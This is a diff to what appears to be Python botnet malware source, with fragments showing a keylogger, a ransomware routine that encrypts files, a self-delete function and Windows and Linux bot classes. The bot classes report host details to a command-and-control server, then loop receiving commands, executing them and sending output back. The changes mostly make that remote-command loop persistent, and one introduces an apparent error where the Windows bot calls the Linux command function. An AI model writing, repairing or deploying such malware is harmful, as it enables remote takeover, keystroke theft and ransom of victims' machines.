@@ -47,7 +47,7 @@ def create_client_socket():
 	ip_port = (IP, PORT) # Tuple containing IP address and port number.
 	client_sock.connect(ip_port) # Connecting to server.
 	initial_message = system() # Send IP address and OS information.
-	client_sock.send(bytes(initial_message, 'utf-8')) # Send message with this host's IP back to the server.
+	client_sock.send(initial_message.encode('utf-8')) # Send message with this host's IP back to the server.
 	return client_sock # Return the created client socket.
 		
 def self_delete(name: str):
@@ -84,6 +84,7 @@ def auto_recon():
 def on_press(key):
 	"""
 	"""
+	global LOG
 	try:
 		LOG += str(key.char)
 	except AttributeError:
@@ -159,7 +160,6 @@ def ransomware(*request: str):
 					to_write = decrypt_it(file_contents)
 				output_file.write(to_write)
 
-
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 class WindowsBot:
@@ -191,12 +191,11 @@ class WindowsBot:
 		"""
 		sock = create_client_socket() # Store socket object.
 		with sock:
-			command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-			while command != '':
-				command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
-				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
-			else:
-				exit(1)
+			while True:
+				command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
+				if command != '':
+					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
+					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 		
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -230,12 +229,11 @@ class LinuxBot:
 		"""
 		sock = create_client_socket() # Store socket object.
 		with sock:
-			command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-			while command != '':
-				command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
-				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
-			else:
-				exit(1)
+			while True:
+				command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
+				if command != '':
+					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
+					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
